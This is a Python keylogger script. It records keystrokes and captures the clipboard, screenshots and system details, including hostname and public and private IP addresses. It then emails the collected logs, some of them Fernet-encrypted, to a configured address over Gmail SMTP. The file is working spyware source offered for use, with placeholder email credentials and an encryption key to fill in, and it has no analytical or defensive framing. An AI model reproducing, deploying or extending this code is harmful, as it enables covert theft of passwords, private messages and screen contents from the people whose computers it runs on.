#!/home/shabha/venv/bin/python

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import time
import os
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
import pyautogui
import pyperclip

# === Configurable Variables ===
system_info = "system.txt"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
keys_info = "keys.txt"

system_info_e = "e_system.txt"
clipboard_info_e = "e_clipboard.txt"
keys_info_e = "e_keys.txt"

time_iterations = 15
iterations_end = 3

filepath = os.path.expanduser("~/keylogger_output")
extend = "/"
filemerge = filepath + extend

# Make sure output path exists
os.makedirs(filemerge, exist_ok=True)

emailaddress = "ENTER IN EMAIL"
password = "ENTER IN PASSWORD"
toaddress = "ENTER IN EMAIL"

encryptionkey = b"ENTER IN YOUR OWN KEY"

username = getpass.getuser()

# === Send Email Function ===
def send_email(filename, attachment, toaddress):
    fromaddress = emailaddress
    message = MIMEMultipart()
    message["From"] = fromaddress
    message["To"] = toaddress
    message["Subject"] = "Keylogger Report"
    message.attach(MIMEText("Attached is the log file.", "plain"))

    payload = MIMEBase("application", "octet-stream")
    payload.set_payload(attachment.read())
    encoders.encode_base64(payload)
    payload.add_header("Content-Disposition", f"attachment; filename={filename}")
    message.attach(payload)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(fromaddress, password)
    server.sendmail(fromaddress, toaddress, message.as_string())
    server.quit()

# === Collect System Info ===
def computer_info():
    with open(filemerge + system_info, "a") as f:
        hostname = socket.gethostname()
        ipaddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipaddress + "\n")

# === Cross-Platform Clipboard Grab ===
def clipboard():
    with open(filemerge + clipboard_info, "a") as f:
        try:
            data = pyperclip.paste()
            f.write("Clipboard Data:\n" + data)
        except:
            f.write("Clipboard could not be copied")


# === Take Screenshot ===
def screenshot():
    image = pyautogui.screenshot()
    image.save(filemerge + screenshot_info)

# === Keylogger Main Loop ===
iterations = 0
currenttime = time.time()
stoppingtime = time.time() + time_iterations


# === Capture and send system info keylogging starts ===
computer_info()

with open(filemerge + system_info, "rb") as f:
    send_email(system_info, f, toaddress)



while iterations < iterations_end:
    count = 0
    keys = []

    def press(key):
        global keys, count, currenttime
        print(key)
        keys.append(key)
        count += 1
        currenttime = time.time()
        if count >= 1:
            count = 0
            writing_file(keys)
            keys = []

    def writing_file(keys):
        with open(filemerge + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    def release(key):
        if key == Key.esc or currenttime > stoppingtime:
            return False

    with Listener(on_press=press, on_release=release) as listener:
        listener.join()

    if currenttime > stoppingtime:
        with open(filemerge + keys_info, "w") as f:
            f.write(" ")
        screenshot()
        with open(filemerge + screenshot_info, "rb") as f:
            send_email(screenshot_info, f, toaddress)
        clipboard()
        iterations += 1
        currenttime = time.time()
        stoppingtime = time.time() + time_iterations

# === Encrypt & Send Collected Logs ===
files_to_encrypt = [filemerge + system_info, filemerge + clipboard_info, filemerge + keys_info]
encrypted_filenames = [filemerge + system_info_e, filemerge + clipboard_info_e, filemerge + keys_info_e]

fernet = Fernet(encryptionkey)

for i in range(len(files_to_encrypt)):
    with open(files_to_encrypt[i], 'rb') as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(encrypted_filenames[i], 'wb') as f:
        f.write(encrypted)
    with open(encrypted_filenames[i], 'rb') as f:
        send_email(os.path.basename(encrypted_filenames[i]), f, toaddress)

# === Run platform-specific logic (just as placeholder for now) ===
if platform.system() == "Windows":
    print("[*] Running on Windows - customize Windows-specific code here.")
elif platform.system() == "Darwin":
    print("[*] Running on macOS - customize macOS-specific code here.")
elif platform.system() == "Linux":
    print("[*] Running on Linux - customize Linux-specific code here.")

# === End ===
time.sleep(120)
